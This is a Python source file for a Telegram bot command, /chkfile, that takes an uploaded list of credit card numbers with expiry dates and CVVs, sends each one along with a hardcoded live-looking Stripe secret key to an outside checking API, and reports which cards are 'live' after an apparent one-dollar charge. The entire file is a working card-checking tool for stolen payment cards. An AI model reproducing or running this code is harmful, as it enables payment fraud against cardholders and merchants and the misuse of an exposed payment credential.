from DAXXMUSIC import app
import aiohttp
import asyncio
import re
import os
from pyrogram import filters

CONCURRENCY_LIMIT = 1
semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

async def process_credit_card(cc_entry, message, stats, session):
    async with semaphore:
        try:
            x = re.findall(r'\d+', cc_entry)
            if len(x) != 4:
                return
            
            ccn, mm, yy, cvv = x

            VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
            if not ccn.startswith(VALID):
                return

            url = "https://mvy.ai/sk_api/api.php"
            params = {
                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                "sk": "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"
            }

            async with session.get(url, params=params) as response:
                r = await response.json()

                if r['status'] == 'die':
                    stats['declined'] += 1
                    return None
                elif r['status'] == 'approved':
                    stats['approved'] += 1
                    return {
                        'cc': f"{ccn}|{mm}|{yy}|{cvv}",
                        'charge': f"${r['payment_info']['amount']}",
                        'message': r.get('message', 'Approved')
                    }
        except Exception as e:
            return f"Error processing card: {e}\n"

async def format_output(approved_cards):
    if not approved_cards:
        return "No live cards."
    output = ""
    for card in approved_cards:
        output += f"⊗ 𝐆𝐚𝐭𝐞𝐬: Masstxt SK Base 1$ CVV\n⊗ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {card['cc']}\n"
        output += f"⊗ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {card['charge']}\n⊗ 𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {card['message']}\n⊗ 𝐒𝐭𝐚𝐭𝐮𝐬: APPROVED ✅\n\n"
    return output
    
@app.on_message(filters.command("chkfile", prefixes=[".", "/"]))
async def check_cc_file(_, message):
    try:
        reply_msg = message.reply_to_message
        if reply_msg and reply_msg.document:
            status_message = await message.reply_text("Processing your request...")
            file_id = reply_msg.document.file_id
            file_path = await app.download_media(file_id)
            stats = {'total': 0, 'approved': 0, 'declined': 0}

            with open(file_path, 'r') as file:
                lines = file.readlines()

            approved_cards = []
            async with aiohttp.ClientSession() as session:
                tasks = []
                for line in lines:
                    stats['total'] += 1
                    task = process_credit_card(line.strip(), message, stats, session)
                    tasks.append(task)
                    if len(tasks) >= 10:  # Update every 10 tasks
                        results = await asyncio.gather(*tasks)
                        approved_cards.extend([result for result in results if result])
                        tasks = []
                        summary = f"⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐂 𝐈𝐧𝐩𝐮𝐭: {stats['total']} | ⊗ 𝐋𝐢𝐯𝐞: {stats['approved']} | ⊗ 𝐃𝐞𝐚𝐝: {stats['declined']}"
                        await status_message.edit_text(f"Processing your request...\n{summary}")

                if tasks:  # Process remaining tasks
                    results = await asyncio.gather(*tasks)
                    approved_cards.extend([result for result in results if result])

            final_output = await format_output(approved_cards)
            summary = f"Finished processing\n⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {stats['total']} | ⊗ 𝐋𝐢𝐯𝐞: {stats['approved']} | ⊗ 𝐃𝐞𝐚𝐝: {stats['declined']}\n⊗ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: {message.from_user.username}"
            output_file_path = f'{message.from_user.id}_summary.txt'
            with open(output_file_path, 'w') as f:
                f.write(final_output)

            await status_message.edit_text(summary)
            await message.reply_document(document=output_file_path, caption=summary)
            os.remove(file_path)
            os.remove(output_file_path)
        else:
            await message.reply_text("Please reply to a text file containing credit card details.")
    except Exception as e:
        await message.reply_text(f"Error reading CC file: {e}")
